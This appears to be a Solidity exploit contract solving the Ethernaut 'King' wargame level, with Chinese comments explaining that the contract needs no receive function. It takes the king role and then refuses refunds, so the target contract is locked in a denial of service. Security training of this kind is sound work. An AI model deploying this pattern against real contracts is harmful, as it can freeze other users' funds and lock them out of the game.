// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public king_address;

    constructor(address _target) {
        king_address = _target;
    }

    function toKing() public payable{
        payable(king_address).transfer(msg.value);
    }

    /*  可選，無論有沒有註解，都是一樣效果
        如果沒有定義 receive() ，在其他合約同樣無法使用 transfer 發送代幣到此合約
        可參考 07_Force 合約是如何不接收代幣的
    receive() external payable {
        revert();
    }
    */
}